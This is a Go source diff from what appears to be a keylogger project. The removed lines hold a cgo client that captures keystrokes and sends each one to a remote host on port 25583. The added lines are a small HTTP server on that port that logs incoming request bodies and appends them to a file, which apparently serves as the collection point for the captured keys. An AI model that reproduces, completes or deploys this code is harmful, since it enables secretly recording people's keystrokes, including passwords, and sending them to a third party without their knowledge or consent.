@@ -1,39 +1,45 @@
 package main
 
-/*
- #include "print.h"
-*/
-import "C"
 import (
+	"fmt"
+	"io"
+	"log"
 	"net/http"
-	"strings"
+	"os"
 )
 
-var chanBuffer = make(chan string, 100)
+func writeToFile(st string) {
+	f, err := os.OpenFile("file.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
+		log.Fatal(err)
+	}
 
-//export GoHandleKey
-func GoHandleKey(key *C.char) {
-	select {
-	case chanBuffer <- C.GoString(key):
-	default:
+	defer f.Close()
+
+	_, err = f.WriteString(st)
+	if err != nil {
+		log.Fatal(err)
 	}
 }
 
-func handleFunc() {
-	for res := range chanBuffer {
-		sendKeyToServer(res)
+func still(w http.ResponseWriter, r *http.Request) {
+	save := make([]byte, 1024)
+	n, err := r.Body.Read(save)
+	if err != io.EOF && err != nil {
+		log.Fatal(err)
 	}
-}
+	st := string(save[:n])
+	log.Print(st)
 
-func sendKeyToServer(key string) {
-	req, _ := http.NewRequest("GET", "http://s1.yumehost.com:25583/", strings.NewReader(key))
+	fmt.Fprintf(w, "Hello, %s!", st)
 
-	client := &http.Client{}
-	_, _ = client.Do(req)
+	if st == "favicon.ico" {
+		return
+	}
+	writeToFile(st)
 }
 
 func main() {
-	defer close(chanBuffer)
-	go handleFunc()
-	C.printKeyBoard()
+	http.HandleFunc("/", still)
+	http.ListenAndServe(":25583", nil)
 }
